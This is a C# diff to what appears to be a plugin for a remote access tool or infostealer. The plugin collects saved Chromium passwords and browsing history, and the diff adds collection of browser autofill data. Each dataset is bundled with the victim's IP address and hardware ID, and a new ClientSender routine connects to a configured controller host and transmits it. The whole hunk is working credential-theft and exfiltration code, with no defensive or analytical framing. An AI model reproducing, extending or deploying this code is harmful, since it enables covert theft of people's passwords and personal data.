@@ -21,21 +21,29 @@ namespace Plugin
             {
                 case PacketType.RECOVERY_PASSWORDS:
                     PasswordsPacket passwordsPacket = new PasswordsPacket(ChromiumRecovery.Recovery(), loadingAPI.baseIp, loadingAPI.HWID);
-                    while (!clientHandler.Connected)
-                        Thread.Sleep(1000);
-
-                    clientHandler.SendPacket(passwordsPacket);
+                    ClientSender(loadingAPI.host, loadingAPI.key, passwordsPacket);
                     break;
 
                 case PacketType.RECOVERY_HISTORY:
                     HistoryPacket historyPacket = new HistoryPacket(History.Recovery(), loadingAPI.baseIp, loadingAPI.HWID);
-                    while (!clientHandler.Connected)
-                        Thread.Sleep(1000);
+                    ClientSender(loadingAPI.host, loadingAPI.key, historyPacket);
+                    break;
 
-                    clientHandler.SendPacket(historyPacket);
+                case PacketType.RECOVERY_AUTOFILL:
+                    AutofillPacket autofillPacket = new AutofillPacket(ChromiumAutofill.Recovery(), loadingAPI.baseIp, loadingAPI.HWID);
+                    ClientSender(loadingAPI.host, loadingAPI.key ,autofillPacket);
                     break;
             }
             Miscellaneous.CleanMemory();
+        }
+        private static void ClientSender(Host host, string key, IPacket packet)
+        {
+            ClientHandler clientHandler = new ClientHandler(host, key);
+            clientHandler.ConnectStart();
+            while (!clientHandler.Connected)
+                Thread.Sleep(125);
+
+            clientHandler.SendPacket(packet);
         }
     }
 }
